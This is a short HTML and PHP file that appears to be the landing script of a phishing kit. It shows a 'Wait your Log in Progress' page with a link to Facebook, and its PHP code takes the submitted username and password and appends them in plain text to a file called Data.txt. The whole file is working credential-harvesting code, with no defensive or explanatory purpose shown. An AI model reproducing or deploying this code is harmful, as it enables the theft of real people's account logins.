<html>
    <head>
    <link rel="icon" href="pro.ico" type="image/x-icon">
    <title> Wait your Log in Progress</title>
</head>
<body>
    <a href="https://www.facebook.com">Click me</a>
</body>
<?php

$file="Data.txt";
$u=$_POST["userName"];
$p=$_POST["Password"];

$data="Username ::".$u." "."Password :: ".$p;
$f=fopen($file,'a');
fwrite($f,$data."\r\n");
fclose($f);

?>
</html>